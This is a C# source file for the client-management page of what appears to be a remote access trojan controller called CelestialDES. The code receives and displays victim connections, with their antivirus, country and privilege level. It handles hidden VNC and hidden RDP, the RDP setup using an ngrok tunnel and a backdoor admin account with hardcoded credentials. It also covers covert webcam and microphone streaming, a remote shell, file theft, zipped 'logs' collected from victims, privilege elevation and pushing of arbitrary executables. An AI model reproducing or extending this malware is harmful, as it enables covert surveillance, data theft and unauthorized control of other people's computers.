using CelestialDES.Networking.Telepathy;
using CelestialDES.winforms;
using CelestialDES.wpfForms;
using Notifications.Wpf;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Forms;
using System.Windows.Threading;
using static CelestialDES.MainWindow;
using Image = System.Drawing.Image;
using MessageBox = System.Windows.Forms.MessageBox;
using RichTextBox = System.Windows.Controls.RichTextBox;
using WinMM;
using System.Threading.Tasks;
using OpenFileDialog = System.Windows.Forms.OpenFileDialog;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using CelestialDES.Helper.compression;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Window;
using System.Windows.Media.Media3D;
using CelestialDES.Helper;
using System.Windows.Markup;

namespace CelestialDES.Pages
{
    /// <summary>
    /// Логика взаимодействия для Clients.xaml
    /// </summary>
    /// 
    public partial class Clients : System.Windows.Controls.Page
    {
        private static RemoteDesk Form2;
        private static RemoteCam Form3;
        private static HiddenVNC hvnc;
        private static MicroForm microForm;
        private static FileManager fileManager;
        private static StartupManager startupManager;
        private static NetManager netManager;
        private static RemoteChat remoteChat;
        private static TaskMgr CRA;
        private static HostsEditor hostedit;
        private static HiddenRDP hiddenRDP;
        public static bool UsingHQPlayer;
        private static RemoteShell RS;
        public static bool needplay = false;
        public string LastDLExt = ".exe";

        static List<Client> userslist = new List<Client>();
        public List<FileManagerFile> fileslist = new List<FileManagerFile>();
        public List<Startup> startuplist = new List<Startup>();
        public List<TaskMa> tasklist = new List<TaskMa>();
        public List<Connection> connectionlist = new List<Connection>();
        public int CurrentSelectedID = 0;
        MainWindow mainWindow;

        NotificationManager notificationManager = new NotificationManager();
        public Clients(MainWindow mainWindow1)
        {
            InitializeComponent();
            mainWindow = mainWindow1;
            System.Windows.Threading.DispatcherTimer dispatcherTimer = new System.Windows.Threading.DispatcherTimer();
            dispatcherTimer.Tick += new EventHandler(dispatcherTimer_Tick);
            dispatcherTimer.Interval = new TimeSpan(0, 0, 0, 0, 1);
            dispatcherTimer.Start();
        }

        public void ClearUsersList()
        {
            userslist.Clear();
            ListViewU.ItemsSource = "";
            ListViewU.ItemsSource = userslist;
            InformationA.ClientsConnectedInt = 0;
        }

        public void GetRecievedData()
        {
            Networking.Telepathy.Message Data;
            if(ProgramSettings.isServer)
                while (Networking.Server.MainServer.GetNextMessage(out Data))
                    switch (Data.eventType)
                    {

                        case EventType.Connected:
                            string ClientAddress = Networking.Server.MainServer.GetClientAddress(Data.connectionId);
                            if (ProgramSettings.LogClientTrying)
                                mainWindow.homeobj.Logs_Listbox.Items.Add("[" + DateTime.Now.ToString("hh:mm:ss") + " INFO] Client: '" + ClientAddress + "' With ID: '" + Data.connectionId.ToString() + "' Is trying to connect!");
                            InformationA.ClientsConnectedInt++;
                            break;

                        case EventType.Disconnected:
                            try
                            {
                                userslist.Remove(userslist.Find(delegate (Client c) { return c.ID == Data.connectionId; }));
                                InformationA.ClientsConnectedInt--;
                                ListViewU.ItemsSource = "";
                                ListViewU.ItemsSource = userslist;
                            }
                            catch { }
                            if (ProgramSettings.LogNewClient)
                                mainWindow.homeobj.Logs_Listbox.Items.Add("[" + DateTime.Now.ToString("hh:mm:ss") + " INFO] Client:  '" + Data.connectionId.ToString() + "' Disconnected!");
                            break;

                        case EventType.Data:
                            HandleData(Data.connectionId, Data.data);
                            break;
                    }
            else
                while(Networking.NClient.MainClient.GetNextMessage(out Data))
                    switch(Data.eventType)
                    {
                        case EventType.Data:
                            Data.connectionId = 0;
                            HandleData(Data.connectionId, Encryption.Encrypt(Data.data, ProgramSettings.password));
                            break;
                    }
        }
        Bitmap GetBitmapFromSource(BitmapSource source)
        {
            var bs32 = new FormatConvertedBitmap(); 
            bs32.BeginInit();
            bs32.Source = source;
            bs32.DestinationFormat = System.Windows.Media.PixelFormats.Bgra32;
            bs32.EndInit();

            Bitmap bmp = new Bitmap(bs32.PixelWidth, bs32.PixelHeight, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            BitmapData data = bmp.LockBits(new Rectangle(System.Drawing.Point.Empty, bmp.Size), ImageLockMode.WriteOnly, bmp.PixelFormat);
            bs32.CopyPixels(System.Windows.Int32Rect.Empty, data.Scan0, data.Height * data.Stride, data.Stride);
            bmp.UnlockBits(data);
            return bmp;
        }
        public unsafe Bitmap ByteArrayToImage(byte[] ByteArrayIn)
        {
           IStreamCodec _unsafeCodec = new UnsafeStreamCodec(new JpgCompression(99),
                    UnsafeStreamCodecParameters.DontDisposeImageCompressor |
                    UnsafeStreamCodecParameters.UpdateImageEveryTwoSeconds);
            BitmapSource wrb;
            fixed (byte* dataPtr = ByteArrayIn)
                wrb = _unsafeCodec.DecodeData(dataPtr, (uint)ByteArrayIn.Length, Dispatcher.CurrentDispatcher);

            return GetBitmapFromSource(wrb);
        }
        int FramesPerSecoundDesktop = 0, _framesReceivedDesktop = 0, FramesPerSecoundWeb = 0, _framesReceivedWeb = 0;
        DateTime _frameTimestampDesktop = DateTime.Now, _frameTimestampWeb = DateTime.Now;

        public unsafe void HandleData(int ConnectionId, byte[] RawData)
        {
            byte[] ToProcess = RawData.Skip(1).ToArray();
            switch (RawData[0])
            {
                case 0:
                    Task.Run(() => {
                        if (Form2.Visible)
                            try
                            {
                                Form2.pbDesktop.Image = ByteArrayToImage(ToProcess);
                                _framesReceivedDesktop++;

                                if (FramesPerSecoundDesktop == 0 && _framesReceivedDesktop == 0)
                                    _frameTimestampDesktop = DateTime.Now;
                                else if (DateTime.Now - _frameTimestampDesktop > TimeSpan.FromSeconds(1))
                                {
                                    FramesPerSecoundDesktop = _framesReceivedDesktop;
                                    _framesReceivedDesktop = 0;
                                    _frameTimestampDesktop = DateTime.Now;
                                }
                                Form2.Text = "RemoteDesk [FPS: " + FramesPerSecoundDesktop + "]";
                            }
                            catch { }
                    });
                    break;
                case 1:
                    Task.Run(() =>
                    {
                        if (needplay)
                        {
                            if (ToProcess != null)
                                if (UsingHQPlayer)
                                    woplayer.Write(ToProcess);
                                else
                                    woplayer1.Write(ToProcess);
                        }
                    });
                    break;
                case 2:
                    if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\logs"))
                    {
                        Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\logs");
                    }
                    File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\logs\\" + ConnectionId.ToString() + "@" + Environment.TickCount / 100 + "_" + DateTime.Now.ToString("yyyy-mm-dd") + ".zip", ToProcess);
                    if (ProgramSettings.NewLogA && ProgramSettings.EnableNotifications)
                    {
                        var notificationManager = new NotificationManager();

                        notificationManager.Show(new NotificationContent
                        {
                            Title = "New log receieved from",
                            Message = "ID - " + ConnectionId + "\nIP - " + Networking.Server.MainServer.GetClientAddress(ConnectionId) + "\nTick - " + Environment.TickCount / 100,
                            Type = NotificationType.Information
                        });
                    }
                    if (ProgramSettings.LogNewLogA)
                        mainWindow.homeobj.Logs_Listbox.Items.Add("[" + DateTime.Now.ToString("hh:mm:ss") + " INFO] New log recieved from: '" + Networking.Server.MainServer.GetClientAddress(ConnectionId) + "' With ID: '" + ConnectionId + "'");
                    break;
                case 3:
                    UpdateTasksInMgr(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;
                case 4:
                    UpdateInfoComp(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;
                case 5:
                    UpdateRemoteShell(ConnectionId, Encoding.UTF8.GetString(ToProcess));
                    break;
                case 6:
                    string[] stringarray = Encoding.UTF8.GetString(ToProcess).Split( new[] {"<Cel>"}, StringSplitOptions.None );
                    int ints = 0;
                    if (!ProgramSettings.isServer)
                    {
                        ints++;
                        InformationA.ClientsConnectedInt++;
                        ConnectionId = int.Parse(stringarray[0]);
                    }
                    try
                    {
                        if (stringarray.Length <= 10)
                            AddClient(ConnectionId, stringarray[ints], stringarray[ints + 1], stringarray[ints + 2],
                                stringarray[ints + 3], stringarray[ints + 4], stringarray[ints + 5], stringarray[ints + 6], stringarray[ints + 7], stringarray[ints + 8], stringarray[ints + 9], "outdated");
                        else
                            AddClient(ConnectionId, stringarray[ints], stringarray[ints + 1], stringarray[ints + 2],
                                stringarray[ints + 3], stringarray[ints + 4], stringarray[ints + 5], stringarray[ints + 6], stringarray[ints + 7], stringarray[ints + 8], stringarray[ints + 9], stringarray[ints + 10]);
                    }
                    catch { InformationA.ClientsConnectedInt--; }
                    if (ProgramSettings.PlayClientCon)
                    {
                        try
                        {
                            System.Media.SoundPlayer player = new System.Media.SoundPlayer(@"sound.wav");
                            player.Play();
                        }
                        catch (Exception ex){
                            var notificationManager = new NotificationManager();

                            notificationManager.Show(new NotificationContent
                            {
                                Title = "Exception",
                                Message = ex.Message,
                                Type = NotificationType.Information
                            });
                        }
                    }
                    break;
                case 8:
                    fileslist.Clear();
                    string[] allFiles = Encoding.UTF8.GetString(ToProcess).Split(new string[] { "|FPA_FM|" }, StringSplitOptions.None);
                    for (int i = 0; i < allFiles.Length; i++)
                    {
                        string file = allFiles[i];
                        if (file == string.Empty) continue;
                        if (!Regex.IsMatch(file, "[a-zA-Z]")) continue;

                        if (file.StartsWith("[Folder]"))
                        {
                            FileManagerFile fileD = new FileManagerFile();
                            fileD.Name = file.Replace("[Folder]", "");
                            fileD.Type = "Folder";
                            fileD.Size = " ";
                            fileslist.Add(fileD);
                        }
                        else if (file.StartsWith("[Drive]"))
                        {
                            FileManagerFile fileD = new FileManagerFile();
                            fileD.Name = file.Replace("[Drive]", "");
                            fileD.Type = "Drive";
                            fileD.Size = " ";
                            fileslist.Add(fileD);
                        }
                        else if (file.StartsWith("[Removable]"))
                        {
                            FileManagerFile fileR = new FileManagerFile();
                            fileR.Name = file.Replace("[Removable]", "");
                            fileR.Type = "Removable";
                            fileR.Size = " ";
                            fileslist.Add(fileR);
                        }
                        else if (file.StartsWith("[CD]"))
                        {
                            FileManagerFile fileC = new FileManagerFile();
                            fileC.Name = file.Replace("[CD]", "");
                            fileC.Type = "CD";
                            fileC.Size = " ";
                            fileslist.Add(fileC);
                        }
                        else
                        {
                            FileManagerFile fileC = new FileManagerFile();
                            fileC.Name = file;
                            fileC.Type = "File";
                            fileC.Size = GetFormattedSize(Convert.ToInt64(allFiles[i+1]));
                            fileslist.Add(fileC);
                        }
                    }
                    fileManager.ListViewF.ItemsSource = "";
                    fileManager.ListViewF.ItemsSource = fileslist;
                    break;
                case 9: // FileManager enviroment browse
                    fileManager.PathText.Text = Encoding.UTF8.GetString(ToProcess);
                    break;
                case 10:
                    if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\Downloads"))
                    {
                        Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\Downloads");
                    }
                    Random random = new Random();
                    File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\Downloads\\" + ConnectionId.ToString() + "@" + Networking.Server.MainServer.GetClientAddress(ConnectionId) + "_" + DateTime.Now.ToString("yyyy-mm-dd") + "-" + random.Next() + LastDLExt, ToProcess);
                    break;
                case 11:
                    if (microForm != null) microForm.Close();
                    microForm = new MicroForm(this);
                    microForm.ConnectionID = CurrentSelectedID;
                    microForm.devicescount = Convert.ToInt32(Encoding.UTF8.GetString(ToProcess));
                    microForm.Show();
                    try
                    {
                        woplayer1.Open(WaveFormat.Pcm8Khz8BitMono);
                        woplayer.Open(WaveFormat.Pcm44Khz16BitMono);
                    }
                    catch { }
                    break;
                case 12:
                    if (ProgramSettings.EnableNotifications && ProgramSettings.NotificationsCC)
                    {
                        string[] error = Encoding.UTF8.GetString(ToProcess).Split(';');
                        var notificationManager = new NotificationManager();

                        notificationManager.Show(new NotificationContent
                        {
                            Title = "Scripting",
                            Message = "Error - " + error[1] + "\n" + "on line " + error[0],
                            Type = NotificationType.Error
                        });
                    }
                    break;
                case 13:
                    startuplist.Clear();
                    string[] allstartups = Encoding.UTF8.GetString(ToProcess).Split(';');
                    for (int i = 0; i < allstartups.Length; i++)
                    {
                        if (allstartups[i] == string.Empty) continue;
                        string[] splittedStart = allstartups[i].Split('|');
                        Startup startup = new Startup();
                        startup.name = splittedStart[0];
                        startup.type = splittedStart[1];
                        startuplist.Add(startup);
                    }
                    startupManager.ListViewF.ItemsSource = "";
                    startupManager.ListViewF.ItemsSource = startuplist;
                    break;
                case 14:
                    connectionlist.Clear();
                    string[] allconnections = Encoding.UTF8.GetString(ToProcess).Split('-');
                    for (int i = 0; i < allconnections.Length; i++)
                    {
                        if (allconnections[i] == string.Empty) continue;
                        string[] splittedCon = allconnections[i].Split(';');
                        Connection connection = new Connection();
                        connection.Protocol = splittedCon[0];
                        connection.Local = splittedCon[1];
                        connection.Remote = splittedCon[2];
                        connection.State = splittedCon[3];
                        connectionlist.Add(connection);
                    }
                    netManager.ListViewF.ItemsSource = "";
                    netManager.ListViewF.ItemsSource = connectionlist;
                    break;
                case 15:
                    if(Encoding.UTF8.GetString(ToProcess) == "")
                    {
                        if (ProgramSettings.EnableNotifications)
                            notificationManager.Show(new NotificationContent
                            {
                                Title = "Webcam viewer",
                                Message = "No webcams found",
                                Type = NotificationType.Information
                            });
                        return;
                    }
                    if (Form3 == null) Form3 = new RemoteCam();
                    if (Form3.IsDisposed) Form3 = new RemoteCam();
                    Form3.ConnectionID = CurrentSelectedID;
                    string[] needtoadd = Encoding.UTF8.GetString(ToProcess).Split(';');
                    Form3.comboBox1.Items.Clear();
                    for (int i = 0; i < needtoadd.Length; i++)
                    {
                        if (needtoadd[i].Length <= 1) continue;
                        Form3.comboBox1.Items.Add(needtoadd[i]);
                    }
                    Form3.comboBox1.SelectedIndex = 0;
                    Form3.Show();
                    break;
                case 16:
                    Task.Run(() =>
                    {
                        using (MemoryStream memoryStream = new MemoryStream(ToProcess))
                        {
                            Form3.GetImage = (Image)Image.FromStream(memoryStream).Clone();
                            Form3.pbDesktop.Image = Form3.GetImage;

                            _framesReceivedWeb++;

                            if (FramesPerSecoundWeb == 0 && _framesReceivedWeb == 0)
                                _frameTimestampWeb = DateTime.Now;
                            else if (DateTime.Now - _frameTimestampWeb > TimeSpan.FromSeconds(1))
                            {
                                FramesPerSecoundWeb = _framesReceivedWeb;
                                _framesReceivedWeb = 0;
                                _frameTimestampWeb = DateTime.Now;
                            }
                            Form3.Text = "RemoteCam [FPS: " + FramesPerSecoundWeb + "]";
                        }
                    });
                    break;
                case 17:
                    remoteChat.txtChat.AppendText("Him: " + Encoding.UTF8.GetString(ToProcess) + Environment.NewLine);
                    break;
                case 18:
                    hostedit = new HostsEditor();
                    hostedit.ConnectionID = ConnectionId;
                    hostedit.hoststext.Text = Encoding.UTF8.GetString(ToProcess);
                    hostedit.Show();

                   if ( userslist[ListViewU.SelectedIndex].Privileges.ToString().ToLower() == "user" )
                   {
                        var notificationManager = new NotificationManager();

                        notificationManager.Show(new NotificationContent
                        {
                            Title = "No admin rights",
                            Message = "You can only view hosts file, but you cannot edit them.",
                            Type = NotificationType.Warning
                        });
                   }else hostedit.buttonClck.IsEnabled = true;
                    break;
                case 19:
                    string[] recievedRDPinfo = Encoding.UTF8.GetString(ToProcess).Split(';');
                    if (Convert.ToBoolean(recievedRDPinfo[0])) hiddenRDP.Ngrokinstalled.Foreground = new SolidColorBrush(Colors.Green);
                    else hiddenRDP.Ngrokinstalled.Foreground = new SolidColorBrush(Colors.Red);

                    if (recievedRDPinfo[1] == "false")
                    {
                        hiddenRDP.Ngrokstarted.Foreground = new SolidColorBrush(Colors.Red);
                    }
                    else
                    {
                        hiddenRDP.Ngrokstarted.Foreground = new SolidColorBrush(Colors.Green);
                        hiddenRDP.Ngrokstarted.Text = "Ngrok Started - ";
                        hiddenRDP.Ngrokcreditionals.Text = recievedRDPinfo[1];
                    }

                    if (Convert.ToBoolean(recievedRDPinfo[2])) { hiddenRDP.UserCreated.Foreground = new SolidColorBrush(Colors.Green); hiddenRDP.UserCreated.Text = "User account created - CelestialRDP:qwerty10"; }
                    else hiddenRDP.UserCreated.Foreground = new SolidColorBrush(Colors.Red);
                    if (Convert.ToBoolean(recievedRDPinfo[3])) hiddenRDP.UserAdmin.Foreground = new SolidColorBrush(Colors.Green);
                    else hiddenRDP.UserAdmin.Foreground = new SolidColorBrush(Colors.Red);
                    if (Convert.ToBoolean(recievedRDPinfo[4])) hiddenRDP.WrapperInst.Foreground = new SolidColorBrush(Colors.Green);
                    else hiddenRDP.WrapperInst.Foreground = new SolidColorBrush(Colors.Red);
                    if (Convert.ToBoolean(recievedRDPinfo[5])) hiddenRDP.WrapperListen.Foreground = new SolidColorBrush(Colors.Green);
                    else hiddenRDP.WrapperListen.Foreground = new SolidColorBrush(Colors.Red);
                    break;
                case 20:
                    if(Form2 != null)
                    {
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add((int)17);
                        PacketSender.Send(Form2.ConnectionID, ToSend.ToArray());
                        Form2.Dispose();
                        Form2.Close();
                    }

                    Form2 = new RemoteDesk();

                    Form2.ConnectionID = CurrentSelectedID;
                    string[] ScreenMetrics = userslist[ListViewU.SelectedIndex].SMet.Split('x');
                    Form2.ResX = Convert.ToInt16(ScreenMetrics[0]);
                    Form2.ResY = Convert.ToInt16(ScreenMetrics[1]);
                    Form2.Show();
                    for (int i = 0; i < Convert.ToInt32(Encoding.UTF8.GetString(ToProcess)); i++)
                    {
                        Form2.comboBox1.Items.Add("\\\\.\\DISPLAY" + (i + 1).ToString());
                    }
                    Form2.comboBox1.SelectedIndex = 0;
                    Form2.comboBox2.SelectedIndex = 0;
                    break;
                case 21:
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Exception",
                        Message = Encoding.UTF8.GetString(ToProcess),
                        Type = NotificationType.Error
                    });
                    break;
                case 22:
                    Task.Run(() => {
                        if (hvnc.Visible)
                            try
                            {
                                hvnc.customPictureBox1.Image = ByteArrayToImage(ToProcess);
                                _framesReceivedDesktop++;

                                if (FramesPerSecoundDesktop == 0 && _framesReceivedDesktop == 0)
                                    _frameTimestampDesktop = DateTime.Now;
                                else if (DateTime.Now - _frameTimestampDesktop > TimeSpan.FromSeconds(1))
                                {
                                    FramesPerSecoundDesktop = _framesReceivedDesktop;
                                    _framesReceivedDesktop = 0;
                                    _frameTimestampDesktop = DateTime.Now;
                                }
                                hvnc.Text = "Hidden virtual network computing [FPS: " + FramesPerSecoundDesktop + "]";
                            }
                            catch { }
                    });
                    break;
                case 23:
                    userslist.Remove(userslist.Find(delegate (Client c) { return c.ID == Int32.Parse(Encoding.UTF8.GetString(ToProcess)); }));
                    InformationA.ClientsConnectedInt--;
                    ListViewU.ItemsSource = "";
                    ListViewU.ItemsSource = userslist;
                    break;
            }
        }

        public static string GetFormattedSize(long size)
        {
            if (size < 1024)
                return $"{size} B";
            if (size < Math.Pow(1024, 2))
                return $"{(double)size / Math.Pow(1024, 1):0.##} KB";
            if (size < Math.Pow(1024, 3))
                return $"{(double)size / Math.Pow(1024, 2):0.##} MB";
            return $"{(double)size / Math.Pow(1024, 3):0.##} GB";
        }

        public void UpdateInfoComp(int ConnectionId, string Info)
        {
            string[] InfoArray = Info.Split(',');
            SysInfo CIF = new SysInfo(InfoArray);
            CIF.Show();
            CIF.ConnectionID = ConnectionId;
        }

        public static string GetSubstringByString(string a, string b, string c)
        {
            try
            {
                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
            }
            catch { }

            return "";
        }

        public bool IsRichTextBoxEmpty(RichTextBox rtb)
        {
            if (rtb.Document.Blocks.Count == 0) return true;
            TextPointer startPointer = rtb.Document.ContentStart.GetNextInsertionPosition(LogicalDirection.Forward);
            TextPointer endPointer = rtb.Document.ContentEnd.GetNextInsertionPosition(LogicalDirection.Backward);
            return startPointer.CompareTo(endPointer) == 0;
        }

        public void UpdateRemoteShell(int ConnectionId, string Output)
        {
            foreach (System.Windows.Window window in System.Windows.Application.Current.Windows.OfType<RemoteShell>())
                if (RS.Visibility == Visibility.Visible && RS.ConnectionID == ConnectionId && RS.Update)
                {
                    if (IsRichTextBoxEmpty(RS.txtConsole))
                        RS.txtConsole.AppendText(Output);
                    else
                        RS.txtConsole.AppendText(Environment.NewLine + Output);
                    return;
                }

            RS = new RemoteShell();
            RS.ConnectionID = ConnectionId;
            RS.Show();
            if (RS.ConnectionID == ConnectionId)
            {
                if (IsRichTextBoxEmpty(RS.txtConsole))
                    RS.txtConsole.AppendText(Output);
                else
                    RS.txtConsole.AppendText(Environment.NewLine + Output);
            }
        }

        public struct FileManagerFile
        {
            public string Name { get; set; }
            public string Type { get; set; }
            public string Size { get; set; }
        }
        public struct Startup
        {
            public string name { get; set; }
            public string type { get; set; }
        }

        public struct Connection
        {
            public string Protocol { get; set; }
            public string Local { get; set; }
            public string Remote { get; set; }
            public string State { get; set; }
        }
        public struct TaskMa
        {
            public string PN { get; set; }
            public string PID { get; set; }
            public string WN { get; set; }
        }

        public void UpdateTasksInMgr(int ConnectionId, string Processes)
        {
            string[] ProcessesArrayRaw = Processes.Split(new[] { "][" }, StringSplitOptions.None);
            string[] ProcessesArray = ProcessesArrayRaw.Skip(1).ToArray();
            List<string> ProcessesList = new List<string>(ProcessesArray);
            ProcessesList.AddRange(ProcessesArray);
            foreach (System.Windows.Window window in System.Windows.Application.Current.Windows.OfType<TaskMgr>())
                if (CRA.Visibility == Visibility.Visible && CRA.ConnectionID == ConnectionId)
                {
                    CRA.ListViewA.Items.Clear();
                    tasklist.Clear();
                    foreach (string S in ProcessesArray)
                    {
                        string PName = GetSubstringByString("{", "}", S);
                        string PID = GetSubstringByString("<", ">", S);
                        string PWindow = GetSubstringByString("[", "]", S);
                        TaskMa Taskma = new TaskMa();
                        Taskma.PN = PName;
                        Taskma.PID = PID;
                        Taskma.WN = PWindow;
                        tasklist.Add(Taskma);
                        CRA.ListViewA.Items.Add(Taskma);
                    }

                    return;
                }

            CRA = new TaskMgr(this);
            CRA.Show();
            CRA.ConnectionID = ConnectionId;
            if (CRA.ConnectionID == ConnectionId)
            {
                CRA.ListViewA.Items.Clear();
                foreach (string S in ProcessesArray)
                {
                    string PName = GetSubstringByString("{", "}", S);
                    string PID = GetSubstringByString("<", ">", S);
                    string PWindow = GetSubstringByString("[", "]", S);
                    string[] ToAdd = { PName, PID, PWindow };
                    TaskMa Taskma = new TaskMa();
                    Taskma.PN = PName;
                    Taskma.PID = PID;
                    Taskma.WN = PWindow;
                    tasklist.Add(Taskma);
                    CRA.ListViewA.Items.Add(Taskma);
                }
            }
        }

        public void AddClient(int ID, string IP, string Tag, string AV, string OS, string CPU, string GPU, string Country, string Privileges, string version, string SMet, string isRoot)
        {
            if (ProgramSettings.EnableNotifications && ProgramSettings.NotificationsCC)
            {
                var notificationManager = new NotificationManager();

                notificationManager.Show(new NotificationContent
                {
                    Title = "A new client connected! (" + Tag + ") From " + Country,
                    Message = "ID - " + ID + "\nIP - " + IP + "\nCPU - " + CPU + "\nGPU - " + GPU,
                    Type = NotificationType.Information
                });
            }
            if (ProgramSettings.LogNewClient)
                mainWindow.homeobj.Logs_Listbox.Items.Add("[" + DateTime.Now.ToString("hh:mm:ss") + " INFO] Client: '" + IP + "' With ID: '" + ID + "' Connected!");

            Client client = new Client
            {
                ID = ID,
                IP = IP,
                Tag = Tag,
                AV = AV,
                OS = OS,
                CPU = CPU,
                GPU = GPU,
                Country = Country,
                Privileges = Privileges,
                Version = version,
                SMet = SMet,
                isRoot = isRoot
            };

            userslist.Add(client);
            ListViewU.ItemsSource = "";
            ListViewU.ItemsSource = userslist;
        }
        private void dispatcherTimer_Tick(object sender, EventArgs e)
        {
            GetRecievedData();
        }
        

        private void ListViewU_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                CurrentSelectedID = userslist[ListViewU.SelectedIndex].ID;
            }
            catch { }
        }

        protected struct Client
        {
            public int ID { get; set; }
            public string IP { get; set; }
            public string Tag { get; set; }
            public string AV { get; set; }
            public string OS { get; set; }
            public string CPU { get; set; }
            public string GPU { get; set; }
            public string Privileges { get; set; }
            public string Country { get; set; }
            public string Version { get; set; }
            public string SMet { get; set; }
            public string isRoot { get; set; }
        }

        private void RemoteDesktop_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)60);
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void hVNC_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            hvnc?.Close();
            hvnc?.Dispose();
            hvnc = new HiddenVNC();
            hvnc.ConnectionID = CurrentSelectedID;
            hvnc.Show();
        }

        private void Elevate_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)1);
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void ElevateS_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)50);
            ToSend.AddRange(Encoding.UTF8.GetBytes("0"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void ElevateC_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                    notificationManager.Show(new NotificationContent
                    {
                        Title = "Function",
                        Message = "Please select a client",
                        Type = NotificationType.Error
                    });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)50);
            ToSend.AddRange(Encoding.UTF8.GetBytes("1"));
            PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void Uninstall_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)3);
            if (MessageBox.Show("Are you sure want to uninstall client from " + CurrentSelectedID + "?", "Uninstall Celestial", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void Kill_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)4);
            if (MessageBox.Show("Are you sure want to kill client from " + CurrentSelectedID + "?", "Kill Celestial", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void Update_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Multiselect = false;
            OFD.Filter = "Exe Files (.exe)|*.exe";
            if (OFD.ShowDialog() == DialogResult.OK)
            {;
                string FileString = OFD.FileName;
                byte[] FileBytes;
                using (FileStream FS = new FileStream(FileString, FileMode.Open))
                {
                    FileBytes = new byte[FS.Length];
                    FS.Read(FileBytes, 0, FileBytes.Length);

                    List<byte> ToSendS = new List<byte>();
                    ToSendS.Add((int)35);
                    ToSendS.AddRange(FileBytes);
                    PacketSender.Send(CurrentSelectedID, ToSendS.ToArray());
                }
            }
        }

        private void Disconnect_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)37);
            if (MessageBox.Show("Are you sure want to disconnect client " + CurrentSelectedID + "?", "Disconnect", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                PacketSender.Send(CurrentSelectedID, ToSend.ToArray());
        }

        private void MsgBox_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            if (ListViewU.SelectedItems.Count <= 0)
            {
                if (ProgramSettings.EnableNotifications)
                notificationManager.Show(new NotificationContent
                {
                    Title = "Function",
                    Message = "Please select a client",
                    Type = NotificationType.Error
                });
                return;
            }

            MessageBoxForm msgboxform = new MessageBoxForm();
            msgboxform.ConnectionID = CurrentSelectedID;
            msgboxform.Show();
        }

        private void TTS_Click(object sender, System.Windows.RoutedEventArgs e)
        {
